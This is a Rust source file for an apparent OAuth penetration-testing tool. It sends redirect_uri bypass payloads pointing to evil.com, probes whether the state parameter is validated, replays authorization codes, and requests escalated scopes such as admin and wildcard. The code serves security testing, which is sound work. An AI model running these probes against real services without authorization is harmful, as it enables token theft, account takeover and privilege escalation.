use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

pub async fn redirect(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} OAuth Redirect URI Manipulation", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Auth URL: {}", "[*]".cyan().bold(), auth_url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let payloads = [
        ("Open redirect", "https://evil.com/callback"),
        ("Path traversal", "https://target.com/../evil/callback"),
        ("Subdomain", "https://evil.target.com/callback"),
        ("Localhost", "http://localhost:8080/callback"),
        ("Double slash", "https://target.com//evil.com/callback"),
        ("@ bypass", "https://target.com@evil.com/callback"),
        ("Fragment", "https://target.com/callback#evil.com"),
        ("Encoded @", "https://target.com%40evil.com/callback"),
        ("Null byte", "https://target.com/callback%00.evil.com"),
        ("CRLF", "https://target.com/callback%0d%0ahttps://evil.com"),
    ];

    for (name, redirect_uri) in &payloads {
        let test_url = format!("{}&redirect_uri={}", auth_url, redirect_uri);
        match client.get(&test_url).send().await {
            Ok(resp) => {
                let status = resp.status();
                let location = resp
                    .headers()
                    .get("location")
                    .and_then(|v| v.to_str().ok())
                    .unwrap_or("");
                let accepted = status.is_redirection() && !location.is_empty();
                let status_str = if accepted {
                    "ACCEPTED".red().bold().to_string()
                } else {
                    "rejected".green().to_string()
                };
                println!("  {} {:20} {} {}", "*".cyan(), name, status, status_str);
                if accepted && location.contains("evil") {
                    println!("    {} Redirects to: {}", ">".red().bold(), location);
                }
            }
            Err(_) => {
                println!("  {} {:20} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} Redirect URI test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn state(auth_url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} OAuth State Parameter Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Auth URL: {}", "[*]".cyan().bold(), auth_url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let tests = [
        (
            "No state param",
            format!("{}&redirect_uri=https://target.com/callback", auth_url),
        ),
        (
            "Empty state",
            format!(
                "{}&state=&redirect_uri=https://target.com/callback",
                auth_url
            ),
        ),
        (
            "Weak state (1 char)",
            format!(
                "{}&state=a&redirect_uri=https://target.com/callback",
                auth_url
            ),
        ),
        (
            "Predictable state",
            format!(
                "{}&state=12345&redirect_uri=https://target.com/callback",
                auth_url
            ),
        ),
        (
            "State reuse",
            format!(
                "{}&state=fixedstate123&redirect_uri=https://target.com/callback",
                auth_url
            ),
        ),
    ];

    for (name, test_url) in &tests {
        let resp = client.get(test_url).send().await;
        match resp {
            Ok(r) => {
                let status = r.status();
                let body = r.text().await.unwrap_or_default();
                let has_state_check = body.contains("state") && body.contains("error");
                let status_str = if has_state_check {
                    "VALIDATED".green().to_string()
                } else {
                    "NOT VALIDATED".red().bold().to_string()
                };
                println!(
                    "  {} {:25} status={} {}",
                    "*".cyan(),
                    name,
                    status,
                    status_str
                );
            }
            Err(_) => {
                println!("  {} {:25} error", "*".cyan(), name);
            }
        }
    }

    println!("\n{} State parameter test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn token(
    token_url: &str,
    client_id: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} OAuth Token Reuse Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Token URL: {}", "[*]".cyan().bold(), token_url);
    println!("{} Client ID: {}", "[*]".cyan().bold(), client_id);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    println!(
        "{} Step 1: Requesting initial token...",
        "[*]".cyan().bold()
    );
    let form1 = [
        ("grant_type", "authorization_code"),
        ("code", "test_code"),
        ("client_id", client_id),
        ("redirect_uri", "https://target.com/callback"),
    ];
    let resp1 = client.post(token_url).form(&form1).send().await;
    let token1 = if let Ok(r) = resp1 {
        let body = r.text().await.unwrap_or_default();
        let parsed: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
        parsed["access_token"].as_str().unwrap_or("").to_string()
    } else {
        String::new()
    };

    if token1.is_empty() {
        println!(
            "{} Could not obtain initial token. Testing token endpoint behavior anyway.",
            "[-]".yellow().bold()
        );
    } else {
        println!(
            "{} Got token: {}...",
            "[+]".green().bold(),
            &token1[..token1.len().min(20)]
        );
    }

    println!(
        "{} Step 2: Replaying same authorization code...",
        "[*]".cyan().bold()
    );
    let resp2 = client.post(token_url).form(&form1).send().await;
    if let Ok(r) = resp2 {
        let status = r.status();
        let body = r.text().await.unwrap_or_default();
        let has_new_token = body.contains("access_token");
        let status_str = if has_new_token {
            "TOKEN REUSED - VULN".red().bold().to_string()
        } else {
            "rejected".green().to_string()
        };
        println!("  {} Replay status: {} {}", "*".cyan(), status, status_str);
    }

    println!("\n{} Token reuse test complete.", "[*]".cyan().bold());
    Ok(())
}

pub async fn scope(
    token_url: &str,
    client_id: &str,
    token: Option<&str>,
    timeout: u64,
) -> anyhow::Result<()> {
    println!("{} OAuth Scope Escalation Test", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Token URL: {}", "[*]".cyan().bold(), token_url);
    println!("{} Client ID: {}", "[*]".cyan().bold(), client_id);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);

    let scopes = [
        ("Basic", "read"),
        ("Admin", "admin"),
        ("Full access", "read write admin delete"),
        ("Wildcard", "*"),
        ("System", "system"),
        ("All", "read write admin delete system *"),
    ];

    for (name, scope) in &scopes {
        let form = [
            ("grant_type", "client_credentials"),
            ("client_id", client_id),
            ("scope", scope),
        ];
        let resp = client.post(token_url).form(&form).send().await;
        if let Ok(r) = resp {
            let status = r.status();
            let body = r.text().await.unwrap_or_default();
            let parsed: serde_json::Value = serde_json::from_str(&body).unwrap_or_default();
            let granted_scope = parsed["scope"].as_str().unwrap_or("");
            let has_token = parsed["access_token"].is_string();
            let status_str = if has_token && !granted_scope.is_empty() {
                format!("GRANTED scope={}", granted_scope)
                    .red()
                    .bold()
                    .to_string()
            } else if has_token {
                "TOKEN GRANTED".yellow().to_string()
            } else {
                "rejected".green().to_string()
            };
            println!(
                "  {} {:15} status={} {}",
                "*".cyan(),
                name,
                status,
                status_str
            );
        }
    }

    println!("\n{} Scope escalation test complete.", "[*]".cyan().bold());
    Ok(())
}
